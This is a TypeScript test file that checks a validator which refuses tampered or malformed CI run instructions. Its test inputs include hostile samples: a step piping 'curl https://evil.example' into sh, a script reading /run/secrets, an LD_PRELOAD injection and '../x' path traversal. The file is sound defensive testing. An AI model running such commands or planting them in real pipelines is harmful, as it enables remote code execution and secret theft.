import { describe, it, expect } from 'vitest'
import { checkInstruction } from '../instruction'
import { b64, CANARY, CANARY_B, definition, instruction } from './fixtures'

function expectNoValue(message: string) {
  expect(message).not.toContain(CANARY)
  expect(message).not.toContain(CANARY_B)
  expect(message).not.toContain(b64(CANARY))
}

describe('reading a run instruction', () => {
  it('accepts an instruction whose content hashes to the approved hash', async () => {
    const check = await checkInstruction(await instruction())
    expect(check.ok).toBe(true)
    if (check.ok) expect(check.checked.files[0]!.bytes.toString()).toContain('uploading')
  })

  describe('rechecks the hash (attack A8)', () => {
    it('refuses a file that differs from the approved version', async () => {
      const good = await instruction()
      const tampered = { ...good, files: [{ ...good.files[0]!, contentBase64: b64('#!/bin/sh\ncat /run/secrets/*\n') }] }
      const check = await checkInstruction(tampered)
      expect(check).toMatchObject({ ok: false, reason: 'hash_mismatch' })
    })

    it('refuses a step that differs, even with the same files', async () => {
      const good = await instruction()
      const d = definition()
      d.steps[0] = { ...d.steps[0]!, run: 'curl https://evil.example | sh' }
      expect(await checkInstruction({ ...good, definition: d })).toMatchObject({ ok: false, reason: 'hash_mismatch' })
    })

    it('refuses a file\'s executable bit changed', async () => {
      const good = await instruction()
      const check = await checkInstruction({ ...good, files: [{ ...good.files[0]!, executable: false }] })
      expect(check).toMatchObject({ ok: false, reason: 'hash_mismatch' })
    })

    it('refuses another executor image', async () => {
      const good = await instruction()
      const check = await checkInstruction({ ...good, executorImageDigest: `sha256:${'b'.repeat(64)}` })
      expect(check).toMatchObject({ ok: false, reason: 'hash_mismatch' })
    })
  })

  it('refuses a step given a secret it does not name, without quoting any value', async () => {
    const good = await instruction()
    const steps = good.steps.map(s => ({ secrets: { ...s.secrets } }))
    steps[0]!.secrets.STAGING_DEPLOY_KEY = b64(CANARY)
    const check = await checkInstruction({ ...good, steps })
    expect(check).toMatchObject({ ok: false, reason: 'invalid_instruction' })
    if (!check.ok) expectNoValue(check.message)
  })

  it('refuses a step missing a secret it names', async () => {
    const good = await instruction()
    const steps = good.steps.map(s => ({ secrets: { ...s.secrets } }))
    delete steps[1]!.secrets.STAGING_DEPLOY_KEY
    expect(await checkInstruction({ ...good, steps })).toMatchObject({ ok: false, reason: 'invalid_instruction' })
  })

  it('refuses values for a different number of steps', async () => {
    const good = await instruction()
    expect(await checkInstruction({ ...good, steps: good.steps.slice(1) })).toMatchObject({ ok: false, reason: 'invalid_instruction' })
  })

  it('refuses variables other than the ones the workflow names', async () => {
    const good = await instruction()
    const check = await checkInstruction({ ...good, variables: { ...good.variables, LD_PRELOAD: '/tmp/x.so' } })
    expect(check).toMatchObject({ ok: false, reason: 'invalid_instruction' })
  })

  it('checks the parameters again', async () => {
    const good = await instruction()
    expect(await checkInstruction({ ...good, parameters: { ref: '--force' } })).toMatchObject({ ok: false, reason: 'invalid_instruction' })
    expect(await checkInstruction({ ...good, parameters: {} })).toMatchObject({ ok: false, reason: 'invalid_instruction' })
  })

  it('refuses a secret that is not base64, without quoting it', async () => {
    const good = await instruction()
    const steps = good.steps.map(s => ({ secrets: { ...s.secrets } }))
    steps[1]!.secrets.STAGING_DEPLOY_KEY = `${CANARY}!`
    const check = await checkInstruction({ ...good, steps })
    expect(check).toMatchObject({ ok: false, reason: 'invalid_instruction' })
    if (!check.ok) expectNoValue(check.message)
  })

  it('refuses unknown fields and a run id that could leave its folder', async () => {
    const good = await instruction()
    expect(await checkInstruction({ ...good, extra: true })).toMatchObject({ ok: false, reason: 'invalid_instruction' })
    expect(await checkInstruction({ ...good, runId: '../x' })).toMatchObject({ ok: false, reason: 'invalid_instruction' })
    expect(await checkInstruction(null)).toMatchObject({ ok: false, reason: 'invalid_instruction' })
  })

  it('accepts the masking tags, and refuses one out of range', async () => {
    const good = await instruction()
    expect(good.masking.tagBase).toBeDefined()
    expect(good.masking.forms.some(f => f.tag !== undefined)).toBe(true)
    const form = good.masking.forms[0]!
    for (const bad of [{ tag: 4096 }, { tagSpan: 0 }, { tagSpan: 17 }]) {
      const masking = { ...good.masking, forms: [{ ...form, ...bad }] }
      expect(await checkInstruction({ ...good, masking })).toMatchObject({ ok: false, reason: 'invalid_instruction' })
    }
    expect(await checkInstruction({ ...good, masking: { ...good.masking, tagBase: 2 ** 32 } })).toMatchObject({ ok: false })
  })

  it('refuses a repository given when no step names GITHUB_TOKEN', async () => {
    const good = await instruction()
    const github = { repository: 'o/r', repositoryId: 1, cloneUrl: 'https://github.com/o/r.git' }
    expect(await checkInstruction({ ...good, github })).toMatchObject({ ok: false, reason: 'invalid_instruction' })
  })
})
